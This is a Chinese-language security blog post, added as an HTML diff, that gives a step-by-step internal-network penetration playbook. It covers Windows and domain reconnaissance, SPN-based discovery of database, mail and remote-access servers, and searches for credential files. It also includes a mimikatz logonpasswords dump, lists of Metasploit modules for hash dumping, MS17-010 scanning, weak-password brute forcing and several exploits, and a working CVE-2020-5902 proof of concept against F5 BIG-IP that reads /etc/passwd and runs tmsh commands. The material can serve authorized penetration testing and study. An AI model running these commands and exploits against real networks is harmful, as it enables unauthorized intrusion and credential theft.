@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="loecho">
+<meta name="description" content="安全行业的从业人员">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                <!--点击特效-->
+                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
+                
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://1oecho.github.io">
+                    
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                        Index
+                    </a>
+                    
+                    <a class="menu-item" href="https://1oecho.github.io/tags">
+                        Tags
+                    </a>
+                    
+                    <a class="menu-item" href="https://github.com/loecho-sec">
+                        Whoami
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://1oecho.github.io">
+                            
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                            Index
+                        </a>
+                        
+                        <a class="menu-item" href="https://1oecho.github.io/tags">
+                            Tags
+                        </a>
+                        
+                        <a class="menu-item" href="https://github.com/loecho-sec">
+                            Whoami
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                内网渗透： 资源定位及攻击思路
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-09-10</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">20.6
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">4621</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://1oecho.github.io/Qt3VXtj3c/">内网渗透</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <h3 id="参考">参考：</h3>
+<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200910085714.png" alt="image-20200910085714321" loading="lazy"></figure>
+<h2 id="许多干货都是大佬的大佬提供在实践过程中要逐步完善为自己的">许多干货都是大佬的大佬提供，在实践过程中，要逐步完善为自己的！</h2>
+<h2 id="0x01-基础信息收集">0x01 基础信息收集</h2>
+<h3 id="01webshell-层面的信息收集">01.WebShell 层面的信息收集：</h3>
+<pre><code class="language-cmd"># 当前权限用户的具体确认
+
+whoami /user  # 查看当前用户
+whoami /priv  # 查看具体权限
+query user	  # 查看当前登录用户
+net user name # 查看name用户具体信息
+net user 	  # 当前用户
+net localgroup administrators # 查看administrtor组内的具体用户
+
+
+# 当前主机的具体网络情况
+
+ipconfig /all # 查看当前IP，判断是否存在域环境
+ping t.com	  # 判断网络ICMP是否出网
+arp-a         # 查看ARP-p缓存
+netstat -ano  # 查看本机当前端口情况
+TRACERT -d -h 10 ip # 判断网络出网跳数，从而判断网络结构
+net use 	  # 判断是否存在IPC连接
+net share 	  # 判断共享目录
+
+
+# 主机信息及软件进程排查
+
+wmic OS get Caption,CSDVersion,OSArchitecture,Verion # 当前系统具体信息
+wmic product get name,version # 查看当前软件安装的具体名字以及版本，后续要对各类软件进行敏感信息收集
+systeminfo	  # 查看补丁情况，为提权做准备,后续提权做准备
+tasklist /svc # 查看当前进程，判断是否存在杀软
+net start     # 当前服务启动情况
+set 		  # 判断当前计算机存在的环境变量，后续使用
+powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -property name,version&quot; # 通过powershell获取
+
+# 后续通过结合已知信息进行CS，或MSF上线！
+
+</code></pre>
+<h3 id="02csmsf-阶段的信息收集">02.CS/MSF 阶段的信息收集：</h3>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200908203852.png" alt="image-20200908203852385" loading="lazy"></figure>
+<pre><code class="language-cmd"># 收集域环境信息
+
+net view # 获取当前域或工作组部分在线机器
+net group &quot;domain computer&quot; /domain # 域内存活机器的探测方式
+net view /domain    # 获取当前内网下的所有工作组和域名
+net view /domain:DC # 获取域或工作组的主机列表
+
+
+# 通过Linux命令进行主机名提取，为后续主机存货以及网络结构探测做准备
+
+awk -F &quot; &quot; {'print $1'} list.txt &gt;&gt; name.txt 
+awk -F &quot; &quot; {'print $2'} list.txt &gt;&gt; name.txt 
+awk -F &quot; &quot; {'print $3'} list.txt &gt;&gt; name.txt
+
+
+# 通过主机名，进行批量Ping，判断网络结构，以及各类主机功能
+
+for /f &quot;delims=&quot; %i in (name.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;mark.com&quot; &gt;&gt; retult.txt # 批量Ping
+type C:\HOST-ASP\MTI\Styles\mactoip.txt # 查看结果
+
+
+# 批量获取脚本bat
+
+@echo off setlocal ENABLEDELAYEDEXPANSION @FOR /F &quot;usebackq eol=- skip=1 delims=\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO ( @FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO ( @FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k %%j) ) )
+
+
+# 域内管理员定位：
+
+net user /domain 
+net group &quot;domain admins&quot; /domain
+nltest /domain_trusts # 域信任查询
+
+# 信息提取，提起猜测可能是“admin&quot;的用户，后续收集信息完善使用
+
+awk -F &quot; &quot; {'print $1'} user.txt &gt;&gt; user.txt 
+awk -F &quot; &quot; {'print $2'} user.txt &gt;&gt; user.txt 
+awk -F &quot; &quot; {'print $3'} user.txt &gt;&gt; user.txt 
+egrep -i &quot;admin|manage|vpn&quot; list_user.txt
+
+
+# 批量获取当前域的所有域控及其内网IP
+
+net group &quot;domain controllers&quot; /domain # 获取域控，获取结果不全
+net group &quot;Read-only Domain&quot; 		   # 获取只读权限的域控
+for /f &quot;delims=&quot; %i in (dc.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;mark.com&quot; &gt;&gt; news.txt # 批量ping
+nltest /dclist:DC  					   # 判断主控所在位置
+
+# 获取当前域中的所有组，提取关键的组即可
+
+net group /domain
+
+# 对所获得的组进行分类，细化各组的职能，定点收集
+</code></pre>
+<h3 id="03-spn扫描利用">03. SPN扫描利用</h3>
+<pre><code class="language-cmd"># SPN 组成部分：
+
+# 服务类型 对应机器名 服务端口 默认端口可不写
+
+  MSSQLSvc/Srv DB 0day.0day.org:1433
+</code></pre>
+<h4 id="spn-有价值目标">SPN 有价值目标：</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">各类 基础 数据库服务：</th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">MSSQLSvc</td>
+<td style="text-align:center">SQL Server 数据库</td>
+</tr>
+<tr>
+<td style="text-align:left">Oracle</td>
+<td style="text-align:center">O racle 基于 kerberos 认证</td>
+</tr>
+<tr>
+<td style="text-align:left">postgres</td>
+<td style="text-align:center">postgresql 数据库</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">各类 基础 mail 服务</th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">exchangeMDB</td>
+<td style="text-align:center">exchange 相关服务</td>
+</tr>
+<tr>
+<td style="text-align:left">SMTPSVC</td>
+<td style="text-align:center">SMTP 服务</td>
+</tr>
+<tr>
+<td style="text-align:left">IMAP</td>
+<td style="text-align:center">IMAP 服务</td>
+</tr>
+<tr>
+<td style="text-align:left">POP3</td>
+<td style="text-align:center">POP3 服务</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">各类 基础 Web 服务</th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">HTTPS</td>
+<td style="text-align:center">web 服务 基于 kerberos 认证</td>
+</tr>
+<tr>
+<td style="text-align:left">HTTP</td>
+<td style="text-align:center">web 服务 基于 kerberos 认证</td>
+</tr>
+<tr>
+<td style="text-align:left">Jboss</td>
+<td style="text-align:center">java web 服务 中间件 Redhat jboss</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">各类 基础 文件 服务</th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">DNS</td>
+<td style="text-align:center">DNS服务</td>
+</tr>
+<tr>
+<td style="text-align:left">FTP</td>
+<td style="text-align:center">FTP服务</td>
+</tr>
+<tr>
+<td style="text-align:left">NFS</td>
+<td style="text-align:center">NFS服务</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">各类远程管理 类 服务</th>
+<th style="text-align:center"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">TERMSRV</td>
+<td style="text-align:center">Windows RDP 远程桌面服务</td>
+</tr>
+<tr>
+<td style="text-align:left">WSMAN</td>
+<td style="text-align:center">Windows 远程管理服务</td>
+</tr>
+<tr>
+<td style="text-align:left">vnc</td>
+<td style="text-align:center">VNC</td>
+</tr>
+<tr>
+<td style="text-align:left">VPN</td>
+<td style="text-align:center">远程接入服务</td>
+</tr>
+</tbody>
+</table>
+<h4 id="通过spn定向寻找数据库相关服务">通过spn定向寻找数据库相关服务：</h4>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200908174833.png" alt="image-20200908174833145" loading="lazy"></figure>
+<pre><code class="language-cmd"># Windwos 7 以后都默认自带setspn
+
+setspn T DC-Name Q */* | findstr &quot;MSSQLSvc&quot; # 直接过滤Mssql服务
+
+# 因为得到的spn结果，可能都不存活，我们批量Ping一下，判断存活
+
+awk F &quot;/&quot; {'print $2'} mac.txt | awk F &quot;.&quot; {'print $1'} | uniq &gt; res.txt
+
+for /f &quot;delims=&quot; %i in (res.txt) do @ping w 1 n 1 %i | findstr /c:&quot; DC-name &quot; &gt;&gt; PerfLogs news.txt
+
+setspn T dc-name Q */* | findstr &quot;oracle&quot; # 同理过滤“Oracle服务”，其他同类数据库服务也如此
+</code></pre>
+<h4 id="借助-spn-快速-定位当前目标-域中-所有-存活-的-ldap-服务器">借助 SPN 快速 定位当前目标 域中 所有 存活 的 ldap 服务器：</h4>
+<pre><code class="language-cmd"># 通常情况下，都为域控制器
+
+setspn T dc-name Q */* | findstr &quot;ldap&quot; # 所有 LDAP SPN 的 机器名 都带有典型 的 DC 字样
+</code></pre>
+<h4 id="借助-spn-快速-定位当前目标-域中-邮件-服务器">借助 SPN 快速 定位当前目标 域中 邮件 服务器：</h4>
+<pre><code class="language-cmd">setspn T dc-name Q */* | findstr &quot;exchangeMDB&quot;
+setspn T dc-name Q */* | findstr &quot;SMTPSVC&quot;
+setspn T dc-name Q */* | findstr &quot;IMAP&quot;c v 
+setspn T dc-name Q */* | findstr &quot;POP3&quot;
+
+awk F '/' {'print $2'} mail.txt | awk F '.' {'print $1'} | uniq # 筛选各类主机名
+
+# 批量存活探测
+
+for /f &quot;delims=&quot; %i in (mail.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; mail-re.txt
+</code></pre>
+<h4 id="借助-spn-快速-定位当前目标-域中-web-服务器">借助 SPN 快速 定位当前目标 域中 Web 服务器：</h4>
+<pre><code class="language-cmd">setspn T dc-name Q */* | findstr &quot;HTTP&quot;
+
+setspn T dc-name Q */* | findstr &quot;HTTPS&quot;
+
+for /f &quot;delims=&quot; %i in (webs.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; # Web服务
+</code></pre>
+<h4 id="借助-spn-快速-定位当前-目标-域-中-所有-存活的-dns-服务器">借助 SPN 快速 定位当前 目标 域 中 所有 存活的 DNS 服务器</h4>
+<pre><code class="language-cmd">setspn T dc-name Q */* | findstr &quot;DNS&quot;
+
+for /f &quot;delims=&quot; %i in (dns.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt;  dns.txt
+</code></pre>
+<h4 id="借助-spn-快速-定位当前-目标-域-中-所有-存活的-文件-服务器">借助 SPN 快速 定位当前 目标 域 中 所有 存活的 文件 服务器</h4>
+<pre><code class="language-cmd">setspn T dc-name Q */* | findstr &quot;ftp&quot;
+setspn T dc-name Q */* | findstr &quot;nfs&quot;
+
+for /f &quot;delims=&quot; %i in (ftp.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt;  dns.txt
+</code></pre>
+<h4 id="借助-spn-快速-定位当前-目标-域-中-所有-开启远程-连接服务-服务器">借助 SPN 快速 定位当前 目标 域 中 所有 开启远程 连接服务 服务器</h4>
+<pre><code class="language-cmd">setspn T dc-name Q */* | findstr &quot;TERMSRV&quot; &gt;&gt;&gt; PerfLogs rdp .txt
+setspn T dc-name Q */* | findstr &quot;WSMAN&quot; &gt;&gt; C: PerfLogs winrm .txt
+setspn T dc-name Q */* | findstr &quot;vnc&quot; &gt;&gt; C: PerfLogs vnc .txt
+setspn T dc-name Q */* | findstr &quot;vpn&quot; &gt;&gt; C: PerfLogs vpn .txt
+setspn T dc-name Q */* | findstr &quot;tnetdgines&quot; &gt;&gt; C: PerfLogs tnetdgines .txt
+awk F '/' {'print $2'} **.txt | awk F '.' {'print $1'} | uniq | wc -l
+</code></pre>
+<h3 id="04-内网密码收集">04. 内网密码收集：</h3>
+<pre><code class="language-cmd">#  Mssql配置文件搜集:
+dir /b /s web.config 
+findstr /c:&quot;User ID=&quot; /c:&quot;Password=&quot; /si web.config
+
+# Seatbelt,导出详细信息
+Seatbelt -group=all 
+
+# 列出当前目录结构：
+tree /A |findstr /BV /C:&quot;|   |&quot;
+
+# 针对特定类型的敏感文件进行全盘遍历搜集，比如, 文件类型：
+*.xlsx,*.doc,*.docx,*.txt,*.zip,*.rar,*.7z,*.ovpn,*. vsdx,*.ppt,*pptx,*.php,*.sql,*.md
+
+# 全盘搜带有以下敏感字段的文件,其实还有非常非常多,弟兄们平时在搞的过程中最好一边搞一边积累，常见关键字：
+
+&quot;密码(pass)&quot;, &quot;账号(user)&quot;, &quot;VPN&quot;, 
+&quot;SVN&quot;,&quot;GIT&quot;, &quot;账户(user)&quot;,
+&quot;交接&quot;, &quot;离职&quot;, &quot;登录(login)&quot;,
+ &quot;账密&quot;, &quot;堡垒&quot;, &quot;邮箱(Mail)&quot; , 
+&quot;IT&quot;, &quot;信息安全&quot;, &quot;IT部&quot;, &quot;备份(bak)&quot;,
+ &quot;管理员(admin)&quot;, &quot;内网&quot;, &quot;杀毒&quot; , 
+ &quot;入职&quot;, &quot;服务器&quot; , &quot;运维&quot; , 
+ &quot;平台&quot;, &quot;巡检&quot;, &quot;拓扑&quot;, &quot;资产&quot;, 
+&quot;网络&quot;, &quot;系统&quot;, &quot;后台(system)&quot; , 
+&quot;漏洞&quot;, &quot;扫描&quot;, &quot;数据库&quot;, &quot;交换机&quot;,
+ &quot;ERP&quot;, &quot;防火墙&quot; , &quot;防毒墙&quot;, &quot;合同&quot;,
+  &quot;虚拟&quot;, &quot;集群&quot;, &quot;通讯录&quot;, &quot;订单&quot;
+ &quot;办公&quot;, &quot;权限&quot;, &quot;隔离&quot;, &quot;测试&quot;
+ &quot;网闸&quot;, &quot;监控&quot;, &quot;设备&quot;, &quot;简历&quot;, &quot;工资&quot;
+
+dir /s /b &quot;*密码*&quot; &quot;*登录*&quot; &quot;*资产*&quot; &quot;*VPN*&quot; &quot;*Svn*&quot; &quot;*Git*&quot; &quot;*交接*&quot; &quot;*离职*&quot; &quot;*网络*&quot; &quot;*后台*&quot; &quot;*拓扑*&quot; &quot;*邮箱*&quot; &quot;*工资*&quot; &quot;*管理员*&quot; &quot;*巡检*&quot;
+
+# Server 端配置文件密码收集：
+
+findstr /I /c:&quot;user=&quot; /c:&quot;pass=&quot; /c:&quot;login=&quot; /c:&quot;uid=&quot; /c:&quot;pwd=&quot;  /si *.conf *.asp *.php *.jsp *.aspx *.cgi *.xml *.ini *.inf *.txt *.cgi
+
+
+</code></pre>
+<h2 id="0x03-内网基础资源横向探测">0x03 内网基础资源横向探测</h2>
+<h3 id="05-从主机开始入手">05. 从主机开始入手：</h3>
+<pre><code class="language-cmd"># 通过代理将Msf挂到内网去：
+
+msf &gt; setg Proxies socks5:127.0.0.1:1080
+
+# 通过批量提取到mssql的Hash,Msf使用auxiliary/scanner/mssql/mssql_hashdump模块
+
+msf &gt; use auxiliary/admin/mssql/mssql_sql  # SQL语句模块
+msf &gt; use auxiliary/admin/mssql/mssql_exec # SQL_exec模块
+msf &gt; use auxiliary/scanner/mssql/mssql_hashdump # SQL_Hash模块
+
+
+# MSf主机批量Smb探测:
+
+msf &gt; use auxiliary/scanner/smb/smb_version
+
+# 批量mS17-010
+
+msf &gt; use auxiliary/scanner/smb/smb_ms17_010
+
+# 通过MS17-010_Command模块，进行批量密码搜寻
+
+dir /b /s web.config 
+findstr /c:&quot;User ID=&quot; /c:&quot;Password=&quot; /si web.config &gt;tmps.logs 
+cscript katz.js &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;
+
+# 将所有密码Hash整合，再去撞Hash：
+
+msf &gt; use auxiliary/scanner/smb/smb_login 
+
+</code></pre>
+<h3 id="06-从各类web服务开始入手">06. 从各类Web服务开始入手：</h3>
+<pre><code class="language-cmd"># 确定具体目标，先从单端口，多网段进行探测,线程拉低：
+
+msf &gt; use auxiliary/scanner/portscan/tcp
+
+# 同时对在公网上收集的信息，进行批量ping，筛选所对应的内网服务，重点关注
+
+for /f &quot;delims=&quot; %i in (domains.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;mark.com&quot; &gt;&gt; service.txt
+type service.txt | findstr &quot;10.&quot;
+
+# 快速探测识别目标内网所用的各类基础java web服务
+
+msf &gt; use auxiliary/scanner/http/jboss_vulnscan
+msf &gt; use auxiliary/admin/http/tomcat_administration
+msf &gt; use auxiliary/scanner/http/jenkins_login
+msf &gt; use auxiliary/scanner/http/glassfish_login
+msf &gt; use auxiliary/scanner/http/axis_login
+msf &gt; use auxiliary/scanner/http/webdav_scanner
+msf &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+msf &gt; use auxiliary/scanner/http/http_login
+msf &gt; use auxiliary/scanner/http/joomla_version 
+msf &gt; use auxiliary/scanner/http/wordpress_scanner 
+msf &gt; use auxiliary/scanner/http/phpmyadmin_login
+</code></pre>
+<h3 id="07从各类服务弱口令入手">07.从各类服务弱口令入手:</h3>
+<pre><code class="language-cmd"># Linux SSH版本探测确认具体使用那些版本的Linux系统：
+
+msf &gt; use auxiliary/scanner/ssh/ssh_version
+
+msf &gt; use auxiliary/scanner/ssh/ssh_enumusers # 探测完用户后，通过前期收集的密码，进行单密码碰撞
+
+# Windows 服务探测：
+
+msf &gt; use auxiliary/scanner/rdp/rdp_scanner # RDP探测
+msf &gt; use auxiliary/scanner/vnc/vnc_login	# VNC探测
+
+# 各类工控设备的telnet默认口令：
+
+msf &gt; use auxiliary/scanner/telnet/telnet_version
+
+# 文件服务探测，寻找敏感信息：
+
+msf &gt; use auxiliary/scanner/ftp/ftp_version
+
+# FTP批量常识读写：
+
+msf &gt; use auxiliary/scanner/ftp/anonymous
+
+# 搜集NFS挂载：
+
+msf &gt; use auxiliary/scanner/nfs/nfsmount
+
+# rsync，Web同步常用，搜集配置文件：
+
+msf &gt; use auxiliary/scanner/rsync/modules_list
+
+# SVN 泄露探测:
+
+msf &gt; use auxiliary/scanner/http/svn_scanner
+
+# 各类数据库：
+
+msf &gt; use auxiliary/scanner/mysql/mysql_version # MySQL
+msf &gt; use auxiliary/scanner/db2/db2_version # DB2
+msf &gt; use auxiliary/scanner/postgres/postgres_login # PostGreSQL
+msf &gt; use auxiliary/scanner/redis/redis_login # Redis，重点关注
+
+# 对上面的结果进行,批量SQL命令执行：
+
+msf &gt; use auxiliary/scanner/redis/redis_server 
+msf &gt; use auxiliary/scanner/mongodb/mongodb_login # MongoDB 弱口令
+
+
+
+# Mail通过邮件服务进行探测：
+
+msf &gt; use auxiliary/scanner/smtp/smtp_version # SMmtp版本
+msf &gt; use auxiliary/scanner/imap/imap_version # imap版本探测
+msf &gt; use auxiliary/scanner/pop3/pop3_version # pop3版本探测
+msf &gt; use auxiliary/scanner/lotus/lotus_domino_version # lotus版本探测
+msf &gt; use auxiliary/scanner/http/owa_ews_login # 特定版本zimbra漏洞利用
+msf &gt; use exploit/unix/webapp/zimbra_lfi # 漏洞利用
+</code></pre>
+<h3 id="08-从各类工控网络设备入手">08. 从各类工控网络设备入手：</h3>
+<pre><code class="language-python"># CISCO
+msf &gt; use auxiliary/scanner/http/cisco_device_manager 
+
+# Cisco-VPN
+msf &gt; use auxiliary/scanner/http/cisco_ssl_vpn 
+
+
+# 批量扫描内网下的所有f5设备，通过扫描结果批量探测F5RCE漏洞
+msf &gt; use auxiliary/scanner/http/f5_bigip_virtual_server 
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# project = https://github.com/Xyntax/POC-T
+# author = i@cdxy.me
+
+&quot;&quot;&quot;
+F5 BIG-IP TMUI 远程代码执行漏洞（CVE-2020-5902）
+F5 BIG-IP 是美国 F5 公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在 前台远程执行代码（RCE）漏洞（CVE-2020-5902）。攻击者利用该漏洞，构造恶意请求，在未授权的情况下获得目标服务器的权限，实现远程代码执行。
+
+Usage
+
+  python POC-T.py -s BigF5_Rce -iF target.txt
+  python POC-T.py -s BigF5_Rce -aZ &quot;&quot;
+&quot;&quot;&quot;
+
+import requests
+from plugin.useragent import firefox
+from plugin.urlparser import iterate_path
+
+
+def poc(target):
+    print target
+    base_url = target if &quot;://&quot; in target else 'https://' + target
+    for each in iterate_path(base_url):
+        try:
+            url = each + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
+            #print url
+            g = requests.get(url, headers={'User-Agent': firefox()})
+            if g.status_code is 200 and 'output' in g.content and 'root' in g.content:
+                return url
+            url = each + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
+            g = requests.get(url, headers={'User-Agent': firefox()})
+            if g.status_code is 200 and 'error' in g.content and 'password' in g.content:
+                return url
+        except:pass
+
+    return False
+
+
+# 批量扫描内网下的dlink后门 
+msf &gt; use auxiliary/scanner/http/dlink_user_agent_backdoor 
+
+# 批量探测内网下的zabbix web入口弱口令 
+msf &gt; use auxiliary/scanner/http/zabbix_login
+
+# 批量探测内网下的splunk[主要用于大数据分析] web入口弱口令 
+msf &gt; use auxiliary/scanner/http/splunk_web_login 
+
+# 批量探测下的 snmp挂到socks下跑可能会有些问题,应该是udp协议的问题  弱口令,实际中,万一真的没办法,不妨用这个试着搜集内网机器信息
+msf &gt; use auxiliary/scanner/snmp/snmp_login
+</code></pre>
+<h3 id="09核心系统核心网段探测">09.核心系统核心网段探测：</h3>
+<h4 id="1-外网资产列表">(1) 外网资产列表</h4>
+<p>通过对外部打点时收集到的各类Web资产，批量提取URl，适用于，在获得内网跳板时，已经控下几台机器但是找不到核心资产的情况，将提取的URL，在内网机器上，通过Bat脚本，进行批量Ping提取解析IP为内网IP的资产，重点关注这些网段,刘哥给提供的bat思路，自己可以继续修改:</p>
+<ul>
+<li>Windows 系统环境：</li>
+</ul>
+<pre><code class="language-cmd"># 筛选的关键字，我们可以根据实际情况修改，因为在一些大型公司内部，因为资产的庞大，网络划分直接划分为国外公网IP：
+
+for /f &quot;delims=&quot; %i in (web.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[10.&quot; /c:&quot;[192.&quot; /c:&quot;[172.&quot; &gt;&gt; out.txt
+
+</code></pre>
+<h4 id="2-批量web-title-header提取">(2) 批量Web Title <strong>&amp; Header</strong>提取</h4>
+<p>通过前面阶段的收集，对于获取到的资产网段，我们筛选常用端口：</p>
+<p>80-90，8080， 8090，7001端口，进行批量的<strong>Web Title 提取</strong>，具体实现方法：</p>
+<ul>
+<li>Klion思路，通过Curl以及批处理脚本，简单快捷方式解决：</li>
+<li>我通过Python垃圾实现：</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20200910091853.png" alt="image-20200910091852493" loading="lazy"></figure>
+<h4 id="3-dns爆破枚举">(3) DNS爆破枚举：</h4>
+<p>进行单IP多网段扫描，定位具体DNS服务器位置，通过网络配置也可以判断DNS具体IP：</p>
+<pre><code class="language-cmd"># DNS缓存查看：
+
+ipconfig /displaydns
+
+</code></pre>
+<p>在获得DNS具体IP后，通过各类DNS爆破工具进行枚举和爆破，最终效率需要看字典内容</p>
